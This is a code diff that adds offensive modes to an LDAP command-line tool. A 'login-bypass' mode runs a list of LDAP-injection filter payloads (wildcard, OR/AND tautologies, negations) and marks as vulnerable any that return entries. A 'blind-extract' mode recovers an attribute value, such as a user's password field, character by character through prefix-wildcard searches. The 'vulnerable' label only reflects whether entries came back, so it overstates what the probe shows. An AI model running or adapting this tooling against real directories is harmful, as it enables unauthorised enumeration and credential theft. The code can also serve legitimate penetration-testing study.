@@ -50,6 +50,30 @@ struct Args {
     /// Accept invalid TLS certificates (insecure)
     #[arg(long)]
     insecure: bool,
+
+    /// Base DN to search under (required for --mode login-bypass)
+    #[arg(short = 'b', long)]
+    base_dn: Option<String>,
+
+    /// User attribute name for login-bypass probes
+    #[arg(long, default_value = "uid")]
+    user_attr: String,
+
+    /// Password attribute name for login-bypass probes
+    #[arg(long, default_value = "userPassword")]
+    pass_attr: String,
+
+    /// Target username for login-bypass probes (tests wildcard/any-user payloads when omitted)
+    #[arg(short = 'u', long)]
+    target_user: Option<String>,
+
+    /// Attribute whose value to extract character-by-character (--mode blind-extract)
+    #[arg(long)]
+    extract_attr: Option<String>,
+
+    /// Character set to try during blind extraction [default: a-z A-Z 0-9 and common symbols]
+    #[arg(long)]
+    charset: Option<String>,
 }
 
 #[derive(ValueEnum, Clone, Debug)]
@@ -58,6 +82,10 @@ enum ShowMode {
     #[value(name = "object-classes")]
     ObjectClasses,
     Both,
+    #[value(name = "login-bypass")]
+    LoginBypass,
+    #[value(name = "blind-extract")]
+    BlindExtract,
 }
 
 #[derive(ValueEnum, Clone, Debug)]
@@ -88,6 +116,16 @@ struct ObjectClassInfo {
     sup: Vec<String>,
 }
 
+#[derive(Debug, Serialize)]
+struct BypassResult {
+    payload: String,
+    description: String,
+    filter: String,
+    vulnerable: bool,
+    entries_returned: usize,
+    matched_dns: Vec<String>,
+}
+
 #[tokio::main]
 async fn main() -> Result<()> {
     let args = Args::parse();
@@ -106,6 +144,73 @@ async fn main() -> Result<()> {
             .await?
             .success()
             .context("LDAP bind failed")?;
+    }
+
+    match args.mode {
+        ShowMode::LoginBypass => {
+            let base_dn = args
+                .base_dn
+                .as_deref()
+                .context("--base-dn is required for --mode login-bypass")?;
+            let results = test_login_bypass(
+                &mut ldap,
+                base_dn,
+                &args.user_attr,
+                &args.pass_attr,
+                args.target_user.as_deref(),
+            )
+            .await?;
+            print_bypass_results(results, &args.output)?;
+            ldap.unbind().await?;
+            return Ok(());
+        }
+        ShowMode::BlindExtract => {
+            let base_dn = args
+                .base_dn
+                .as_deref()
+                .context("--base-dn is required for --mode blind-extract")?;
+            let target = args
+                .target_user
+                .as_deref()
+                .context("--target-user is required for --mode blind-extract")?;
+            let extract_attr = args
+                .extract_attr
+                .as_deref()
+                .context("--extract-attr is required for --mode blind-extract")?;
+            let charset = args.charset.as_deref().unwrap_or(DEFAULT_CHARSET);
+            let value = blind_extract(
+                &mut ldap,
+                base_dn,
+                &args.user_attr,
+                target,
+                extract_attr,
+                charset,
+                &args.output,
+            )
+            .await?;
+            match args.output {
+                OutputFormat::Json => {
+                    println!(
+                        "{}",
+                        serde_json::to_string_pretty(&serde_json::json!({
+                            "target_user": target,
+                            "extract_attr": extract_attr,
+                            "value": value,
+                        }))?
+                    );
+                }
+                OutputFormat::Csv => {
+                    println!("target_user,extract_attr,value");
+                    println!("{},{},{}", csv_esc(target), csv_esc(extract_attr), csv_esc(&value));
+                }
+                OutputFormat::Table => {
+                    println!("\nExtracted {extract_attr} = {value:?}");
+                }
+            }
+            ldap.unbind().await?;
+            return Ok(());
+        }
+        _ => {}
     }
 
     let schema_dn = find_schema_dn(&mut ldap).await?;
@@ -135,6 +240,7 @@ async fn main() -> Result<()> {
             }
             print_object_classes(filtered_ocs, &args.output)?;
         }
+        ShowMode::LoginBypass | ShowMode::BlindExtract => unreachable!(),
     }
 
     ldap.unbind().await?;
@@ -244,6 +350,244 @@ async fn fetch_object_classes(ldap: &mut Ldap, schema_dn: &str) -> Result<Vec<Ob
     Ok(ocs)
 }
 
+async fn test_login_bypass(
+    ldap: &mut Ldap,
+    base_dn: &str,
+    user_attr: &str,
+    pass_attr: &str,
+    target_user: Option<&str>,
+) -> Result<Vec<BypassResult>> {
+    let u = user_attr;
+    let p = pass_attr;
+    let t = target_user.unwrap_or("*");
+
+    // (short name, description, filter)
+    let payloads: Vec<(&str, &str, String)> = vec![
+        (
+            "wildcard-both",
+            "Wildcard in both user and password fields",
+            format!("(&({u}=*)({p}=*))"),
+        ),
+        (
+            "wildcard-password",
+            "Exact user, wildcard password",
+            format!("(&({u}={t})({p}=*))"),
+        ),
+        (
+            "negate-password",
+            "Exact user, negate a false password predicate (always true)",
+            format!("(&({u}={t})(!({p}=void)))"),
+        ),
+        (
+            "or-always-true",
+            "OR of any-user with target — short-circuits to true",
+            format!("(|({u}=*)({u}={t}))"),
+        ),
+        (
+            "double-or-inject",
+            "Double OR tautology — common payload: uid=*)(|(uid=*",
+            format!("(|({u}=*)({u}=*))"),
+        ),
+        (
+            "and-tautology",
+            "AND with a tautological sub-expression on the password field",
+            format!("(&({u}={t})(|({p}=*)({p}=*)))"),
+        ),
+        (
+            "objectclass-wildcard",
+            "Any entry matching user attribute with wildcard objectClass",
+            format!("(&({u}=*)(objectClass=*))"),
+        ),
+        (
+            "not-nonexistent",
+            "NOT of a filter that is always false",
+            format!("(!(&({u}=__ldapin_nonexistent__)))"),
+        ),
+        (
+            "empty-password",
+            "Password attribute present but bound to an empty string",
+            format!("(&({u}={t})({p}=))"),
+        ),
+        (
+            "wildcard-user-prefix",
+            "Prefix wildcard on the username (e.g. adm*)",
+            format!("(&({u}={t}*)({p}=*))"),
+        ),
+        (
+            "bare-user-wildcard",
+            "Bare search for any entry carrying the user attribute",
+            format!("({u}=*)"),
+        ),
+    ];
+
+    let mut results = Vec::new();
+
+    for (name, description, filter) in payloads {
+        let outcome = ldap
+            .search(base_dn, Scope::Subtree, &filter, vec!["dn"])
+            .await;
+
+        let (vulnerable, entries_returned, matched_dns) = match outcome {
+            Ok(res) => match res.success() {
+                Ok((entries, _)) => {
+                    let dns: Vec<String> = entries
+                        .iter()
+                        .map(|e| SearchEntry::construct(e.clone()).dn)
+                        .collect();
+                    let count = dns.len();
+                    (count > 0, count, dns)
+                }
+                Err(_) => (false, 0, vec![]),
+            },
+            Err(_) => (false, 0, vec![]),
+        };
+
+        results.push(BypassResult {
+            payload: name.to_owned(),
+            description: description.to_owned(),
+            filter,
+            vulnerable,
+            entries_returned,
+            matched_dns,
+        });
+    }
+
+    Ok(results)
+}
+
+fn print_bypass_results(results: Vec<BypassResult>, fmt: &OutputFormat) -> Result<()> {
+    match fmt {
+        OutputFormat::Table => {
+            use comfy_table::{presets::UTF8_FULL, Cell, Color, Table};
+            let mut table = Table::new();
+            table.load_preset(UTF8_FULL);
+            table.set_header(["Payload", "Vulnerable", "Entries", "Filter", "Description"]);
+            for r in &results {
+                let vuln_cell = if r.vulnerable {
+                    Cell::new("YES").fg(Color::Red)
+                } else {
+                    Cell::new("no").fg(Color::Green)
+                };
+                table.add_row(vec![
+                    Cell::new(&r.payload),
+                    vuln_cell,
+                    Cell::new(r.entries_returned.to_string()),
+                    Cell::new(&r.filter),
+                    Cell::new(&r.description),
+                ]);
+            }
+            println!("{table}");
+            let hits: usize = results.iter().filter(|r| r.vulnerable).count();
+            if hits > 0 {
+                println!("\n{hits}/{} payloads returned entries.", results.len());
+            } else {
+                println!("\nNo payloads returned entries.");
+            }
+        }
+        OutputFormat::Json => {
+            println!("{}", serde_json::to_string_pretty(&results)?);
+        }
+        OutputFormat::Csv => {
+            println!("payload,vulnerable,entries_returned,filter,description,matched_dns");
+            for r in &results {
+                println!(
+                    "{},{},{},\"{}\",\"{}\",\"{}\"",
+                    csv_esc(&r.payload),
+                    r.vulnerable,
+                    r.entries_returned,
+                    r.filter.replace('"', "\"\""),
+                    r.description.replace('"', "\"\""),
+                    r.matched_dns.join("|").replace('"', "\"\""),
+                );
+            }
+        }
+    }
+    Ok(())
+}
+
+const DEFAULT_CHARSET: &str =
+    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._!@#$%^&*()-+=";
+
+/// Escape characters that have special meaning inside an LDAP filter value.
+fn ldap_escape(s: &str) -> String {
+    let mut out = String::with_capacity(s.len());
+    for c in s.chars() {
+        match c {
+            '*' => out.push_str("\\2a"),
+            '(' => out.push_str("\\28"),
+            ')' => out.push_str("\\29"),
+            '\\' => out.push_str("\\5c"),
+            '\0' => out.push_str("\\00"),
+            other => out.push(other),
+        }
+    }
+    out
+}
+
+/// Extract the value of `extract_attr` for the entry identified by
+/// `(&(user_attr=target)(extract_attr=PREFIX*))` one character at a time.
+async fn blind_extract(
+    ldap: &mut Ldap,
+    base_dn: &str,
+    user_attr: &str,
+    target: &str,
+    extract_attr: &str,
+    charset: &str,
+    output: &OutputFormat,
+) -> Result<String> {
+    let mut known = String::new();
+    let live = matches!(output, OutputFormat::Table);
+
+    if live {
+        eprintln!(
+            "Blind-extracting {extract_attr} for {user_attr}={target} under {base_dn}"
+        );
+        eprintln!("Charset: {} chars", charset.chars().count());
+        eprint!("Value: ");
+    }
+
+    loop {
+        let mut found = false;
+
+        for ch in charset.chars() {
+            let candidate = format!("{}{}", known, ch);
+            let filter = format!(
+                "(&({}={})({}={}*))",
+                user_attr,
+                ldap_escape(target),
+                extract_attr,
+                ldap_escape(&candidate),
+            );
+
+            let hit = ldap
+                .search(base_dn, Scope::Subtree, &filter, vec!["dn"])
+                .await
+                .ok()
+                .and_then(|r| r.success().ok())
+                .map(|(entries, _)| !entries.is_empty())
+                .unwrap_or(false);
+
+            if hit {
+                known.push(ch);
+                if live {
+                    eprint!("{ch}");
+                }
+                found = true;
+                break;
+            }
+        }
+
+        if !found {
+            break;
+        }
+    }
+
+    if live {
+        eprintln!();
+    }
+
+    Ok(known)
+}
 
 fn parse_attribute_type(s: &str) -> Option<AttributeInfo> {
     let oid = extract_oid(s)?;
